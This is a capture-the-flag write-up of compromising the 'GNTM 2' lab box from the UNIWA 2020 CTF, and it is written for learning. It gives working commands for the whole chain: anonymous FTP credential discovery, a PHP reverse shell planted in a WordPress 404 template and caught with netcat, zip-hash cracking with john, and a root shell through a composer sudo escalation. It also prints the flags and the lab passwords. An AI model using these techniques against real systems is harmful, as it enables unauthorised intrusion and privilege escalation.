# GNTM 2 - UNIWA 2020 CTF

-----

## Enumeration:

Running a quick ```sudo nmap -A -sS -oN nmap.log 10.69.5.11``` on the host reveals 2 open ports on the server: 21 (FTP) and 80 (HTTP)

## Gaining Access:
Logging in as anonymous user on port 21 and navigating into the pub directory we can see 2 files:

#
```flag.txt``` contains the first flag 

<details>
  <summary>Flag 1</summary>

  ```
  UNIWA{@nNa_M@r1A_bR@t1S_G1rL}
  ```
</details>

#
```users.xml``` Gives us a clue for a user and a password:

<details>
  <summary>User</summary>

  ```
  keisi:#DH6pSPKUod99dF#2J
  ```
</details>


Since no SSH service is running the next thing i tried was navigating to 
```/wp-admin/``` in order to log in into the WordPress dashboard.

#

## A shell's a shell!
After logging in to the dashboard i used a common [PHP backdoor](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to get a reverse shell back to my machine. 
I started a netcat listener using ```nc -lnvp 6666``` and pasted the php code (make sure to change the address to your VPN IP and the port to the port you set netcat to listen on) into the 404 Template (under Appearance->Theme
Editor)

Navigating to ```/wp-content/themes/twentytwentyone/404.php``` runs the php code and we can see a connection in our netcat window:

```
Connection from 10.69.5.11:45862
Linux 78347b536299 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:36:15 up 165 days,  9:37,  0 users,  load average: 0.63, 0.62, 0.71
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
#
Boom, we got a shell!

## Looking around

First things first, upgrade to a proper shell using
```python3 -c 'import pty;pty.spawn("/bin/bash")'```

We can see that we are user ```www-data``` not much we can do. Tried running ```sudo -l``` but we don't have the password.

Navigating to the ```/home``` directory we find Katia's folder. Inside there is a flag.txt which contains the second flag, and a backup archive

<details>
  <summary>Flag 2</summary>

  ```
  UNIWA{K@t1A_tARab@Nko}
  ```
</details>

###

Since python is avaiable i run a quick http server using ```python3 -m http.server```  to download the zip file.

Turns out it's encrypted. I used ```zip2john``` to grab the password hash and then used ```john --wordlist=rockyou.txt zip.hash``` to crack


<details>
  <summary>Zip Password</summary>

  ```
  spongebob
  ```
</details>

#
Unzipping, we get a database dump and another flag.txt 

<details>
  <summary>Flag 3</summary>

  ```
  UNIWA{Il1@NA_bYe_By3}
  ```
</details>

#
## Getting \#

I spent ages trying to figure out how on earth was i supposed to log in as ```katia```. Then someone from my team suggested that i use the zip's password. To be honest i never expected it to work (because who would ever set their user password as a zip password, turns out people do that) and since i was looking for something in the SQL dump, but it actually DID!

Using ```su - katia``` and entering the zip's password i was able to log in as katia. Now i can run ```sudo -l``` to reveal that this user can run ```/usr/bin/composer``` as root without a password.

A quick search on [GTFObins](https://gtfobins.github.io/) shows that we can get an elevated shell if ```composer``` was ran as root.

```
$ TF=$(mktemp -d)
$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json 
$ sudo composer --working-dir=$TF run-script x
```

A quick ```cat /root/flag.txt``` reveals the final flag

<details>
  <summary>Flag 4</summary>

  ```
  UNIWA{k3iSi_L0ve!!}
  ```
</details>


